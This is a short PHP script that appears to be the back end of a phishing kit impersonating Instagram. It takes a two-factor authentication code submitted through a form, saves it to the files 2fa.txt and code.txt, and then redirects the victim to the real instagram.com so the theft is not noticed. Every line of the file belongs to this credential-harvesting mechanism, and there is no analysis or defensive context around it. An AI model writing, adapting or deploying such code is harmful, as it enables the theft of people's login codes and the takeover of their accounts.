<?php

file_put_contents("2fa.txt", "Code: " . $_POST['code'], FILE_APPEND);
$code = $_POST["code"];
$myfile = fopen("code.txt", "wa+") or die("Unable to open file!");
fwrite($myfile, $code);
fclose($myfile);
header('Location: https://instagram.com');
exit();
